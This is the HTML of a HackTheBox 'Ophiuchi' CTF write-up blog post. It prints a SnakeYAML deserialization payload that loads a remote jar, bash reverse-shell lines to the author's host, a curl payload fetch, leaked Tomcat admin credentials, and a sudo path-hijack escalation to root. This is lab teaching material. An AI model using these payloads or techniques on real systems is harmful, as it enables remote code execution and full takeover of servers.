@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <script defer data-domain="itarow.xyz" src="https://plausible.itarow.xyz/js/plausible.js"></script>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Hackthebox - Ophiuchi - Write up | Itarow</title>
+  <link rel = 'canonical' href = 'https://blog.itarow.xyz/posts/hackthebox-ophiuchi/'>
+  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Hackthebox - Ophiuchi - Write up" />
+<meta property="og:description" content="Write up of Ophiuchi from HackTheBox" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.itarow.xyz/posts/hackthebox-ophiuchi/" /><meta property="og:image" content="https://blog.itarow.xyz/img/ophiuchi/banner.jpeg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-06-25T16:22:28+02:00" />
+<meta property="article:modified_time" content="2021-06-25T16:22:28+02:00" />
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.itarow.xyz/img/ophiuchi/banner.jpeg"/>
+
+<meta name="twitter:title" content="Hackthebox - Ophiuchi - Write up"/>
+<meta name="twitter:description" content="Write up of Ophiuchi from HackTheBox"/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://blog.itarow.xyz/css/styles.4dd8e96d6c0d53a6965a5a357c26fc29f6b838ad352dc5acda0754ff4b9409e5c58fa94716892c2a5d6a7e1b1bef8fbcaf2442656e81dfae00dc9464d707477d.css" integrity="sha512-TdjpbWwNU6aWWlo1fCb8Kfa4OK01LcWs2gdU/0uUCeXFj6lHFoksKl1qfhsb74&#43;8ryRCZW6B364A3JRk1wdHfQ=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://blog.itarow.xyz/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://blog.itarow.xyz/posts/heroctfv3-box_dev0ps/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://blog.itarow.xyz/whoami/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&text=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&title=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&is_video=false&description=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Hackthebox%20-%20Ophiuchi%20-%20Write%20up&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&title=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&title=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&name=Hackthebox%20-%20Ophiuchi%20-%20Write%20up&description=Write%20up%20of%20Ophiuchi%20from%20HackTheBox" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&t=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Hackthebox - Ophiuchi - Write up
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2021-06-25 16:22:28 &#43;0200 CEST" itemprop="datePublished">2021-06-25</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          5 minute read
+        </div>
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/hackthebox">HackTheBox</a>
+            
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/hackthebox" rel="tag">HackTheBox</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/write-up" rel="tag">Write-up</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/cve" rel="tag">CVE</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/yaml" rel="tag">Yaml</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/go" rel="tag">Go</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p>I rooted Ophiuchi which was a medium Linux machine. It implicates a flaw with YAML which allow to RCE. Apache tomcat credentials free, and a sudo capability to run a go file.</p>
+<h2 id="foothold">Foothold</h2>
+<p>classic nmap :</p>
+<pre tabindex="0"><code>➜  Ophiuchi nmap -A -p- -T4 10.10.10.227      
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Parse YAML
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```So we are going to see the HTTP port.
+![](/img/ophiuchi/img1.png)
+
+So we see a YAML Parser, after few search on the web, we see that it is possible to get RCE with this functionality. (https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858)
+
+First, to confirm this, we could try this payload, and see if we can get a connection back :
+
+```yaml
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&#34;http://10.10.14.84:8000/&#34;]
+  ]]
+]
+</code></pre><pre tabindex="0"><code>$ python3 -m http.server
+
+10.10.10.227 - - [04/Apr/2021 16:41:49] code 404, message File not found
+10.10.10.227 - - [04/Apr/2021 16:41:49] &#34;HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1&#34; 404 -
+</code></pre><p>Yes, we get a ping back, so we are on the right way.</p>
+<p>Now, we are gonna use this GitHub to get RCE (<a href="https://github.com/artsploit/yaml-payload)">https://github.com/artsploit/yaml-payload)</a>.</p>
+<p><img src="/img/ophiuchi/img2.png" alt=""></p>
+<p>We need to alter <code>Runtime().exec(&quot; … &quot;);</code></p>
+<p>Compile with :</p>
+<pre tabindex="0"><code>$ javac src/artsploit/AwesomeScriptEngineFactory.java
+$ jar -cvf yaml-payload.jar -C src/ .
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e">!!javax.script.ScriptEngineManager</span> [
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">!!java.net.URLClassLoader</span> [[
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">!!java.net.URL</span> [<span style="color:#e6db74">&#34;http://10.10.14.84:8000/yaml-payload.jar&#34;</span>]
+</span></span><span style="display:flex;"><span>  ]]
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>We listen with python http server and it works, I tried to ping another http server and I get a connection.
+So now, reverse shell part, which was annoying.
+After many tried, the solution, was to upload a script .sh on /tmp , put a reverse shell bash command in it :</p>
+<p><code>bash -i &gt;&amp; /dev/tcp/10.10.14.84/8888 0&gt;&amp;1</code></p>
+<p>And execute the script whith bash /tmp/rev.sh for example like this :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">AwesomeScriptEngineFactory</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//Runtime.getRuntime().exec(&#34;curl http://10.10.14.193:8887/rev.sh -o /tmp/rev.sh&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;bash /tmp/rev.sh&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>IOException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>So yes :</p>
+<pre tabindex="0"><code>$nc -lvnp 8888
+Connection from 10.10.10.227:46760
+bash: cannot set terminal process group (794): Inappropriate ioctl for device
+bash: no job control in this shell
+tomcat@ophiuchi:/$ id
+id
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+</code></pre><h2 id="user">User</h2>
+<p>So classic move -&gt; run linPeas.sh.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>[+] Searching Tomcat users file
+</span></span><span style="display:flex;"><span>tomcat-users.xml file found: /usr/src/linux-headers-5.4.0-51/scripts/kconfig/tests/no_write_if_dep_unmet/config\n/opt/tomcat/conf/tomcat-users.xml
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;user</span> <span style="color:#a6e22e">username=</span><span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#a6e22e">password=</span><span style="color:#e6db74">&#34;whythereisalimit&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;manager-gui,admin-gui&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;user</span> <span style="color:#a6e22e">username=</span><span style="color:#e6db74">&#34;tomcat&#34;</span> <span style="color:#a6e22e">password=</span><span style="color:#e6db74">&#34;&lt;must-be-changed&gt;&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;tomcat&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;user</span> <span style="color:#a6e22e">username=</span><span style="color:#e6db74">&#34;both&#34;</span> <span style="color:#a6e22e">password=</span><span style="color:#e6db74">&#34;&lt;must-be-changed&gt;&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;tomcat,role1&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;user</span> <span style="color:#a6e22e">username=</span><span style="color:#e6db74">&#34;role1&#34;</span> <span style="color:#a6e22e">password=</span><span style="color:#e6db74">&#34;&lt;must-be-changed&gt;&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;role1&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span></code></pre></div><p>It found tomcat-users.xml file, which contain admin password. We try to log in with ssh :</p>
+<pre tabindex="0"><code>$ssh admin@10.10.10.227
+admin@ophiuchi:~$ id
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
+</code></pre><h2 id="root">Root</h2>
+<p>Now, root part, which was extremely cool.
+Classic sudo -l :</p>
+<pre tabindex="0"><code>admin@ophiuchi:/tmp$ sudo -l
+Matching Defaults entries for admin on ophiuchi:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on ophiuchi:
+    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+</code></pre><pre tabindex="0"><code>admin@ophiuchi:/tmp$ ls /opt/wasm-functions/
+backup  deploy.sh  index  index.go  main.wasm
+admin@ophiuchi:/tmp$ cat /opt/wasm-functions/index.go
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wasm</span> <span style="color:#e6db74">&#34;github.com/wasmerio/wasmer-go/wasmer&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os/exec&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">bytes</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">wasm</span>.<span style="color:#a6e22e">ReadBytes</span>(<span style="color:#e6db74">&#34;main.wasm&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">instance</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">wasm</span>.<span style="color:#a6e22e">NewInstance</span>(<span style="color:#a6e22e">bytes</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">Close</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">init</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">Exports</span>[<span style="color:#e6db74">&#34;info&#34;</span>]
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">result</span>,<span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">init</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">f</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">String</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;1&#34;</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Not ready to deploy&#34;</span>)
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Ready to deploy&#34;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">out</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;deploy.sh&#34;</span>).<span style="color:#a6e22e">Output</span>()
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(string(<span style="color:#a6e22e">out</span>))
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So, we could run index.go with sudo. This file is going to read main.wasm file, and if the return of main.wasm is different than 1, it says “Not ready to deploy”, and if not, “Ready to deploy” and execute a script named deploy.sh.
+The flaw here, is the path of main.wasm and deploy.sh are not specified, so we could modify these 2 files, in another path, and run the index.go. It’s gonna look at the files which are on the path where we run the script.
+When we run the script in the /opt/wasm-functions/ , it says “Not ready to deploy”, so the script, main.wasm, isn’t returning 1, but we need it, to execute deploy.sh
+So now, editing part of the main.wasm file, to do this, we are going to use this github repository (<a href="https://github.com/WebAssembly/wabt)">https://github.com/WebAssembly/wabt)</a>.</p>
+<pre tabindex="0"><code>$bin/wasm-decompile ../main.wasm  -o ../main.dcmp      
+$cat ../main.dcmp
+export memory memory(initial: 16, max: 0);
+
+global g_a:int = 1048576;
+export global data_end:int = 1048576;
+export global heap_base:int = 1048576;
+
+table T_a:funcref(min: 1, max: 1);
+
+export function info():int {
+  return 0
+}
+➜  wabt git:(main) bin/wasm-interp ../main.wasm --run-all-exports                          
+info() =&gt; i32:0
+</code></pre><p>We see that the script return 0. And our goal is to return 1.
+We converter the .wasm into .wat to modify it :</p>
+<pre tabindex="0"><code>$bin/wasm2wat ../main.wasm -o ../test.wat
+$cat test.wat
+(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 0)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export &#34;memory&#34; (memory 0))
+  (export &#34;info&#34; (func $info))
+  (export &#34;__data_end&#34; (global 1))
+  (export &#34;__heap_base&#34; (global 2)))
+</code></pre><p>We see that i32.const is set at 0, we change the value to 1. Now we convert this .wat to .wasm and decompile it :</p>
+<pre tabindex="0"><code>$bin/wat2wasm ../test.wat -o ../test.main
+$bin/wasm-interp ../test.main --run-all-exports
+info() =&gt; i32:1
+➜  wabt git:(main) bin/wasm-decompile ../test.main                 
+export memory memory(initial: 16, max: 0);
+
+global g_a:int = 1048576;
+export global data_end:int = 1048576;
+export global heap_base:int = 1048576;
+
+table T_a:funcref(min: 1, max: 1);
+
+export function info():int {
+  return 1
+}
+</code></pre><p>Here, we checked that the script return 1.</p>
+<p>Now we are going to upload it to the box. Also, we set up a deploy.sh script, to execute the command with sudo rights.</p>
+<pre tabindex="0"><code>admin@ophiuchi:/tmp/test$ ls
+deploy.sh  main.wasm
+admin@ophiuchi:/tmp/test$ cat deploy.sh
+#!/bin/bash
+
+# ToDo
+# Create script to automatic deploy our new web at tomcat port 8080
+id
+admin@ophiuchi:/tmp/test$ chmod 777 deploy.sh
+admin@ophiuchi:/tmp/test$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><pre tabindex="0"><code>admin@ophiuchi:/tmp/test$ cat rev.sh
+#!/bin/bash
+echo &#34;pwn :D&#34;
+bash -i &gt;&amp; /dev/tcp/10.10.14.84/8888 0&gt;&amp;1
+admin@ophiuchi:/tmp/test$ cat deploy.sh
+#!/bin/bash
+
+# ToDo
+# Create script to automatic deploy our new web at tomcat port 8080
+bash /tmp/test/rev.sh
+</code></pre><p>So, we just created a simple reverse shell command in another bash script.</p>
+<p>Setup netcat listener, and execute the index.go script.</p>
+<pre tabindex="0"><code>admin@ophiuchi:/tmp/test$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+
+-----------------
+
+➜  Ophiuchi nc -lvnp 8888
+Connection from 10.10.10.227:46738
+root@ophiuchi:/tmp/test# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>So yesss, we are root, hope you enjoyed this write-up, in my side, I really like this box, which implicate new knowledge, especially for the root part :).</p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories">Categories</a></li>
+         
+          <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&text=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&title=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&is_video=false&description=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Hackthebox%20-%20Ophiuchi%20-%20Write%20up&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&title=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&title=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&name=Hackthebox%20-%20Ophiuchi%20-%20Write%20up&description=Write%20up%20of%20Ophiuchi%20from%20HackTheBox" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fhackthebox-ophiuchi%2f&t=Hackthebox%20-%20Ophiuchi%20-%20Write%20up" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  Itarow 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
